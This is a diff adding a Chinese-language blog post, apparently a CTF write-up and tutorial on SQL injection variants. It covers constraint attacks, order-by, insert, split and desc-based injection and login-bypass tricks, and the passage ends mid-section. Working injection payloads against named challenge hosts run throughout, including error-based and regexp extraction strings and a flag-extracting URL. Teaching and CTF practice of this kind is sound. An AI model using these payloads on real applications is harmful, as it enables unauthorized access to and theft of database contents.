@@ -1,0 +1,1453 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="cn">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+  
+  
+    
+      
+    
+    
+      
+    
+  <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+  <link href="//cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-flash.min.css" rel="stylesheet">
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic|Monda:300,300italic,400,400italic,700,700italic|Lobster Two:300,300italic,400,400italic,700,700italic|PT Mono:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+  
+
+<link href="//maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=6.4.0" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=6.4.0">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=6.4.0">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=6.4.0">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=6.4.0" color="#222">
+
+
+
+
+
+
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '6.4.0',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="到最后，你还是选择奔向那种滚烫的人生….  什么？又是注入？？，没错，又双叒叕谈注入">
+<meta name="keywords" content="SQL注入">
+<meta property="og:type" content="article">
+<meta property="og:title" content="又双叒叕谈注入">
+<meta property="og:url" content="https://lengjibo.github.io/moresql/index.html">
+<meta property="og:site_name" content="冷逸的个人博客|开往安河桥北~">
+<meta property="og:description" content="到最后，你还是选择奔向那种滚烫的人生….  什么？又是注入？？，没错，又双叒叕谈注入">
+<meta property="og:locale" content="cn">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007F8GgBly1g5p4uga2dqj30hx03jjrc.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007F8GgBly1g5p4z4alqsj30qz0fqgm3.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007F8GgBly1g5q8siekqaj30qb02zq34.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007F8GgBly1g5p55xsb3tj30g6084t8s.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007F8GgBly1g5p5cteihnj30fb093t94.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007F8GgBly1g5p5fj397pj30dl09174d.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007F8GgBly1g5q8sr8gqaj30pz0eg0ub.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007F8GgBly1g5q99tku83j311405tq3b.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007F8GgBly1g5q9gf4g63j30jr08074n.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007F8GgBly1g5q9jprnb4j30kc02gt8s.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007F8GgBly1g5qa1h1bzrj30ny0jjjrv.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007F8GgBly1g5qabbb7kgj30ri0abgol.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007F8GgBly1g5qacfvedsj30jt087mxk.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007F8GgBly1g5qauzq5enj30b609x748.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007F8GgBly1g5qxmnrd44j30u40740t5.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007F8GgBly1g5qxogvimrj30tn075dg8.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007F8GgBly1g5qxpdoa8zj30et045a9y.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007F8GgBly1g5qxqtmupmj30rv07e0t6.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007F8GgBly1g5qxskypu9j30fr0b8aa8.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007F8GgBly1g5qxt7oic4j30j40ajwev.jpg">
+<meta property="og:updated_time" content="2019-08-07T03:10:13.340Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="又双叒叕谈注入">
+<meta name="twitter:description" content="到最后，你还是选择奔向那种滚烫的人生….  什么？又是注入？？，没错，又双叒叕谈注入">
+<meta name="twitter:image" content="http://ww1.sinaimg.cn/large/007F8GgBly1g5p4uga2dqj30hx03jjrc.jpg">
+
+
+
+  <link rel="alternate" href="/../../.deploy_git/atom.xml" title="冷逸的个人博客|开往安河桥北~" type="application/atom+xml" />
+
+
+
+
+  <link rel="canonical" href="https://lengjibo.github.io/moresql/"/>
+
+
+
+<script type="text/javascript" id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>又双叒叕谈注入 | 冷逸的个人博客|开往安河桥北~</title>
+  
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style type="text/css">
+    .use-motion .motion-element,
+    .use-motion .brand,
+    .use-motion .menu-item,
+    .sidebar-inner,
+    .use-motion .post-block,
+    .use-motion .pagination,
+    .use-motion .comments,
+    .use-motion .post-header,
+    .use-motion .post-body,
+    .use-motion .collection-title { opacity: initial; }
+
+    .use-motion .logo,
+    .use-motion .site-title,
+    .use-motion .site-subtitle {
+      opacity: initial;
+      top: initial;
+    }
+
+    .use-motion {
+      .logo-line-before i { left: initial; }
+      .logo-line-after i { right: initial; }
+    }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="cn">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">冷逸的个人博客|开往安河桥北~</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="Toggle navigation bar">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+    <a href="/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-home"></i> <br />Accueil</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+    <a href="/about/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-user"></i> <br />A propos</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+    <a href="/tags/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />Tags</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+    <a href="/categories/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-th"></i> <br />Categories</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+    <a href="/archives/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />Archives</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-book">
+    <a href="/book/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-book"></i> <br />book</a>
+  </li>
+
+      
+      
+    </ul>
+  
+
+  
+    
+
+  
+
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://lengjibo.github.io/moresql/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="冷逸">
+      <meta itemprop="description" content="做一个温柔的人...">
+      <meta itemprop="image" content="https://i.screenshot.net/9zoe9ax">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="冷逸的个人博客|开往安河桥北~">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">又双叒叕谈注入
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+        
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posté le</span>
+              
+
+              
+                
+              
+
+              <time title="Post created: 2019-08-05 21:08:27" itemprop="dateCreated datePublished" datetime="2019-08-05T21:08:27+08:00">2019-08-05</time>
+            
+
+            
+              
+
+              
+                
+                <span class="post-meta-divider">|</span>
+                
+
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Edited on</span>
+                
+                <time title="Updated at: 2019-08-07 11:10:13" itemprop="dateModified" datetime="2019-08-07T11:10:13+08:00">2019-08-07</time>
+              
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/web安全/" itemprop="url" rel="index"><span itemprop="name">web安全</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="post-meta-item-icon"
+            >
+            <i class="fa fa-eye"></i>
+             Views:  
+            <span class="busuanzi-value" id="busuanzi_value_page_pv" ></span>
+            </span>
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>到最后，你还是选择奔向那种滚烫的人生….</p>
+<hr>
+<p>什么？又是注入？？，没错，又双叒叕谈注入</p>
+<a id="more"></a>
+<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>继续对SQL注入进行一个总结以及学习，本文目录如下：</p>
+<ul>
+<li>SQL约束攻击</li>
+<li>order by后的注入</li>
+<li>insert、update、delete后的注入</li>
+<li>http分割注入</li>
+<li>desc相关问题</li>
+<li>万能密码</li>
+<li>\N问题</li>
+</ul>
+<p>唔，新姿势不多，望各位师傅莫怪</p>
+<h2 id="SQL约束攻击"><a href="#SQL约束攻击" class="headerlink" title="SQL约束攻击"></a>SQL约束攻击</h2><p>SQL约束攻击并不是一种很新颖的攻击方式，它的成因是因为在处理SQL中的字符串时，字符串末尾的空格字符都会被删除。换句话说，“lengyi”与“lengyi ”几乎是等效的，这在大多数情况下是正确的，例如WHERE子句中的字符串或INSERT语句中的字符串。例如，以下语句的查询结果，与使用用户名“lengyi”进行查询时的结果是一样的。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> student <span class="keyword">where</span> <span class="keyword">name</span> = <span class="string">'caocao  '</span>;</span><br><span class="line"></span><br><span class="line">等同于</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> student <span class="keyword">where</span> <span class="keyword">name</span> = <span class="string">'caocao'</span>;</span><br></pre></td></tr></table></figure>
+<p>本地可以看下效果</p>
+<p><img src="http://ww1.sinaimg.cn/large/007F8GgBly1g5p4uga2dqj30hx03jjrc.jpg" alt=""></p>
+<p>我们以一个题目来看一下，题目地址：</p>
+<p><a href="http://123.206.31.85:49163/" target="_blank" rel="noopener">http://123.206.31.85:49163/</a></p>
+<p>这是一道很典型的sql约束攻击的题目</p>
+<p>我们可以注册一个如</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">账号：admin[多个空格]           </span><br><span class="line">密码：random_pass</span><br></pre></td></tr></table></figure>
+<p>那么我们在登录的时候就相当于执行了</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> username <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> username=<span class="string">'admin'</span> <span class="keyword">AND</span> <span class="keyword">password</span>=<span class="string">'random_pass'</span>;</span><br></pre></td></tr></table></figure>
+<p>虽然我们查询的是我们自己的用户名，但是返回的却是目标的用户名，这样就达到了越权的目的</p>
+<p><img src="http://ww1.sinaimg.cn/large/007F8GgBly1g5p4z4alqsj30qz0fqgm3.jpg" alt=""></p>
+<h2 id="order-by后的注入"><a href="#order-by后的注入" class="headerlink" title="order by后的注入"></a>order by后的注入</h2><p>常见的order by注入一般会使用报错、布尔、时间进行注入</p>
+<p>一个典型的报错注入如下</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> student2 <span class="keyword">order</span> <span class="keyword">by</span> updatexml(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="string">'~'</span>,(<span class="keyword">select</span> <span class="keyword">version</span>())),<span class="string">'xxx'</span>);</span><br></pre></td></tr></table></figure>
+<p><img src="http://ww1.sinaimg.cn/large/007F8GgBly1g5q8siekqaj30qb02zq34.jpg" alt=""></p>
+<p>在说 order by 注入之前我们先来看两条SQL语句</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="number">2</span>|<span class="number">3</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="number">2</span>&amp;<span class="number">3</span>;</span><br></pre></td></tr></table></figure>
+<p><img src="http://ww1.sinaimg.cn/large/007F8GgBly1g5p55xsb3tj30g6084t8s.jpg" alt=""></p>
+<p>为什么会出现这种结果呢？这是因为SQL中的位运算符的比较，其实是2和3的二进制的比较，即10和11进行|还有&amp;运算，那么就会得到刚才的结果</p>
+<p>理解完这个之后我们继续进行order by后的测试</p>
+<p>我们还是先来看两个语句</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> student2 <span class="keyword">order</span> <span class="keyword">by</span> <span class="keyword">id</span>|<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> student2 <span class="keyword">order</span> <span class="keyword">by</span> <span class="keyword">id</span>|<span class="number">2</span>;</span><br></pre></td></tr></table></figure>
+<p><img src="http://ww1.sinaimg.cn/large/007F8GgBly1g5p5cteihnj30fb093t94.jpg" alt=""></p>
+<p>那么为什么会出现这种效果呢？</p>
+<p>我们再来看一下另外的两条语句</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">id</span> <span class="keyword">from</span> student2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">id</span>|<span class="number">2</span> <span class="keyword">from</span> student2;</span><br></pre></td></tr></table></figure>
+<p>效果如下：</p>
+<p><img src="http://ww1.sinaimg.cn/large/007F8GgBly1g5p5fj397pj30dl09174d.jpg" alt=""></p>
+<p>其实它的过程是这样的</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1     2      3</span><br><span class="line">001   010    011</span><br><span class="line">010   010    010</span><br><span class="line"></span><br><span class="line">011   010    011</span><br><span class="line">3     2      3</span><br></pre></td></tr></table></figure>
+<p>即取出的id的值和2进行了一次或运算，这样也就能明白刚才</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> student2 <span class="keyword">order</span> <span class="keyword">by</span> <span class="keyword">id</span>|<span class="number">2</span>;</span><br></pre></td></tr></table></figure>
+<p>这条语句的结果了</p>
+<p>那么这也就意味着我们的2这个位置是可以控制的了，也就可以进行注入了</p>
+<p>题目地址：<a href="https://chall.tasteless.eu/level1/index.php" target="_blank" rel="noopener">https://chall.tasteless.eu/level1/index.php</a></p>
+<p>页面是由一大堆的排序字符组成的，给出了提示：hint: table level1_flag column flag 即表名和列名</p>
+<p>因为没有传参的地方，fuzz得到参数为dir（后来才知道原本的url应该为<a href="https://chall.tasteless.eu/level1/index.php?dir=）" target="_blank" rel="noopener">https://chall.tasteless.eu/level1/index.php?dir=）</a></p>
+<p>因为知道是order by注入，所以尝试desc和asc，发现页面果然产生了变化</p>
+<p><img src="http://ww1.sinaimg.cn/large/007F8GgBly1g5q8sr8gqaj30pz0eg0ub.jpg" alt=""></p>
+<p>然后我们又知道order by后面的注入可以使用|进行测试</p>
+<p><a href="https://chall.tasteless.eu/level1/index.php?dir=|2" target="_blank" rel="noopener">https://chall.tasteless.eu/level1/index.php?dir=|2</a></p>
+<p>果然页面发生了变化，此时我们的思路就出来了</p>
+<blockquote>
+<p><a href="https://chall.tasteless.eu/level1/index.php?dir=|(注入语句)+1" target="_blank" rel="noopener">https://chall.tasteless.eu/level1/index.php?dir=|(注入语句)+1</a></p>
+</blockquote>
+<p>因为这时候当语句为真时，+1=2则页面返回与之前不同，以此来判断每个值，这里我选择使用正则注入，最后构造的SQL语句为</p>
+<blockquote>
+<p>|(select(select flag from level1_flag)regexp ‘正则’)+1</p>
+</blockquote>
+<p>当然这样的过程是十分无聊而又缓慢的，这个时候我们可以去写一个简单的脚本来实现它，这里本人就不去显露我那可悲的py功底了…</p>
+<h2 id="insert、update、delete后的注入"><a href="#insert、update、delete后的注入" class="headerlink" title="insert、update、delete后的注入"></a>insert、update、delete后的注入</h2><p>insert 后的</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> student <span class="keyword">values</span>(<span class="number">3</span>,<span class="string">'attack'</span><span class="keyword">or</span> updatexml(<span class="string">'anything'</span>,<span class="keyword">concat</span>(<span class="string">'~'</span>,(<span class="keyword">select</span> <span class="keyword">user</span>())),<span class="string">'ll'</span>),<span class="string">'test'</span>);</span><br></pre></td></tr></table></figure>
+<p><img src="http://ww1.sinaimg.cn/large/007F8GgBly1g5q99tku83j311405tq3b.jpg" alt=""></p>
+<p>或者将语句插入到数据库中，则查询时显示</p>
+<p><img src="http://ww1.sinaimg.cn/large/007F8GgBly1g5q9gf4g63j30jr08074n.jpg" alt=""></p>
+<p>delete或update同理</p>
+<p><img src="http://ww1.sinaimg.cn/large/007F8GgBly1g5q9jprnb4j30kc02gt8s.jpg" alt=""></p>
+<p>题目地址：</p>
+<p><a href="https://chall.tasteless.eu/level15/index.php" target="_blank" rel="noopener">https://chall.tasteless.eu/level15/index.php</a></p>
+<p>这个一个很经典可以对数据库进行操作的题目</p>
+<p>用户名和文本的输入会插入到数据库里面，然后进行一个查询输出，后端的数据库语句可能为</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> (<span class="keyword">name</span>,<span class="built_in">text</span>) <span class="keyword">values</span> (<span class="string">''</span>,<span class="string">''</span>);</span><br></pre></td></tr></table></figure>
+<p>那么我们一般的思路就是我们可以闭合前面的引号，然后注释掉后面的内容，可是这里有一个很头疼的问题就是单引号被过滤了，但是我们可以使用\进行把引号去掉，那么这个时候后面的引号就会和前面的引号产生闭合，此时我们再增加一个,加我们的语句，最后我们后端的数据库语句就变成了</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> (<span class="keyword">name</span>,<span class="built_in">text</span>) <span class="keyword">values</span> (<span class="string">'\''</span>,<span class="keyword">select</span> <span class="keyword">version</span>()#)</span><br></pre></td></tr></table></figure>
+<p>所以最后构造的payload如下：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">\</span><br><span class="line"></span><br><span class="line">,(<span class="keyword">select</span> flag <span class="keyword">from</span> level15_flag))#</span><br></pre></td></tr></table></figure>
+<p><img src="http://ww1.sinaimg.cn/large/007F8GgBly1g5qa1h1bzrj30ny0jjjrv.jpg" alt=""></p>
+<h2 id="http分割注入"><a href="#http分割注入" class="headerlink" title="http分割注入"></a>http分割注入</h2><p>我们一般的SQL语句一般是where username=’???’ and password=’???’   而sql语句中可以使用/<strong>/注释掉中间的SQL语句。也就是说，我们可以使用/</strong>/来解决某些问题，而且/**/也没有被吃掉，这叫做HTTP分割注入。</p>
+<p>题目地址：<a href="http://ctf5.shiyanbar.com/web/baocuo/index.php" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/web/baocuo/index.php</a></p>
+<p>因为此类问题比较简单，直接给出payload</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> username=<span class="string">''</span><span class="keyword">or</span> extractvalue <span class="comment">/*' and password='*/</span>(<span class="number">1</span>, <span class="keyword">concat</span>(<span class="number">0x5c</span>,(<span class="keyword">select</span> <span class="keyword">database</span>()))) <span class="keyword">or</span><span class="string">''</span></span><br></pre></td></tr></table></figure>
+<h2 id="desc相关问题"><a href="#desc相关问题" class="headerlink" title="desc相关问题"></a>desc相关问题</h2><p>我们先来看下desc的相关介绍</p>
+<p><img src="http://ww1.sinaimg.cn/large/007F8GgBly1g5qabbb7kgj30ri0abgol.jpg" alt=""></p>
+<p>也就是说在表名后面可以跟列名或者是正则表达式，这样我们可带入我们的sql注入语句</p>
+<p><img src="http://ww1.sinaimg.cn/large/007F8GgBly1g5qacfvedsj30jt087mxk.jpg" alt=""></p>
+<p>题目地址：<a href="http://web.jarvisoj.com:32794/" target="_blank" rel="noopener">http://web.jarvisoj.com:32794/</a></p>
+<p>访问以下页面拿到源码</p>
+<p><a href="http://web.jarvisoj.com:32794/index.php" target="_blank" rel="noopener">http://web.jarvisoj.com:32794/index.php</a>~</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span>(<span class="string">"config.php"</span>);</span><br><span class="line">$table = $_GET[<span class="string">'table'</span>]?$_GET[<span class="string">'table'</span>]:<span class="string">"test"</span>;</span><br><span class="line">$table = Filter($table);</span><br><span class="line">mysqli_query($mysqli,<span class="string">"desc `secret_&#123;$table&#125;`"</span>) <span class="keyword">or</span> Hacker();</span><br><span class="line">$sql = <span class="string">"select 'flag&#123;xxx&#125;' from secret_&#123;$table&#125;"</span>;</span><br><span class="line">$ret = sql_query($sql);</span><br><span class="line"><span class="keyword">echo</span> $ret[<span class="number">0</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>语句很简单，这里不在多说</p>
+<p>唯一值得注意的就是</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">mysqli_query($mysqli,<span class="string">"desc `secret_&#123;$table&#125;`"</span>) <span class="keyword">or</span> Hacker();</span><br><span class="line"><span class="keyword">echo</span> $ret[<span class="number">0</span>];</span><br></pre></td></tr></table></figure>
+<p>在 mysql是作为保留字符的，连续的两个反引号相当于一个空格，而且desc支持两个参数，那么我们就可以尝试注入了，又因为在第二句为了输出我们想要的，需要查询的第一部分失效</p>
+<p>最后构造payload：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">test` ` where 1=2  union <span class="keyword">select</span> <span class="number">1</span></span><br></pre></td></tr></table></figure>
+<p>那么本来的语句就会变成</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">desc `secret_test` ` where 1=2  union <span class="keyword">select</span> <span class="number">1</span><span class="string">`</span></span><br><span class="line"><span class="string">select 'flag&#123;xxx&#125;' from secret_test`</span> <span class="string">` where 1=2  union select 1</span></span><br></pre></td></tr></table></figure>
+<p>最后得到flag</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">http://web.jarvisoj.com:32794/index.php?table=test`%20`%20where%201=2%20union%20select%20flagUwillNeverKnow%20from%20secret_flag</span><br></pre></td></tr></table></figure>
+<p><img src="http://ww1.sinaimg.cn/large/007F8GgBly1g5qauzq5enj30b609x748.jpg" alt=""></p>
+<h2 id="万能密码"><a href="#万能密码" class="headerlink" title="万能密码"></a>万能密码</h2><p>关于万能密码，网上有很多前辈已经总结过了，这里就不班门弄斧，下面的几个姿势不知道的可以学习下，知道的请略过…</p>
+<p>嘿嘿嘿</p>
+<p>双引号法：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> student2 <span class="keyword">where</span> <span class="keyword">name</span> = <span class="string">''</span>+<span class="string">''</span> <span class="keyword">and</span> gender = <span class="string">''</span>+<span class="string">''</span>;</span><br></pre></td></tr></table></figure>
+<p><img src="http://ww1.sinaimg.cn/large/007F8GgBly1g5qxmnrd44j30u40740t5.jpg" alt=""></p>
+<p>双等于法：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> student2 <span class="keyword">where</span> <span class="keyword">name</span> = <span class="string">'aaa'</span>=<span class="string">''</span> <span class="keyword">and</span> gender = <span class="string">'aaa'</span>=<span class="string">''</span>;</span><br></pre></td></tr></table></figure>
+<p><img src="http://ww1.sinaimg.cn/large/007F8GgBly1g5qxogvimrj30tn075dg8.jpg" alt=""></p>
+<p>或者这样的</p>
